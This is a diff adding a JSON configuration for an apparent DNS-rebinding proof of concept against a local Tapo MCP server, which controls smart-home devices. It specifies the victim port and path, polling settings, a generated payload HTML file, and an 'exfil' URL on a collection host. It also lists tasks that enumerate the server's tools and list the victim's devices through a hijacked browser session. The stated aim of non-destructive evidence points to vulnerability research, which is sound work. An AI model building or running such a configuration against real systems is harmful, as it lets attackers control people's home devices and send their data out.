@@ -1,0 +1,39 @@
+{
+  "name": "tapo-root-8082",
+  "targetName": "tapo-mcp",
+  "transport": "streamable",
+  "port": 8082,
+  "path": "/",
+  "strategy": "fs",
+  "pollMs": 800,
+  "maxTries": 120,
+  "exfil": "http://dashboard.example.com:8090/c",
+  "out": "payloads/tapo-root-8082.html",
+  "impact": {
+    "summary": "A rebound browser session can operate the victim's local Tapo MCP server and control or inspect configured smart-home devices.",
+    "vulnerableCondition": "The Tapo MCP server exposes Streamable HTTP on the loopback root path and accepts browser-originated requests after DNS rebinding.",
+    "evidenceGoal": "Show MCP initialize metadata, tools/list, and a non-destructive device discovery operation through the captured browser session."
+  },
+  "tasks": [
+    {
+      "name": "Enumerate MCP tools",
+      "kind": "tools/list"
+    },
+    {
+      "name": "List Tapo devices",
+      "kind": "tools/call",
+      "tool": "list_devices",
+      "args": {}
+    },
+    {
+      "name": "Raw tools/list",
+      "kind": "rpc",
+      "rpc": {
+        "jsonrpc": "2.0",
+        "id": 1,
+        "method": "tools/list",
+        "params": {}
+      }
+    }
+  ]
+}
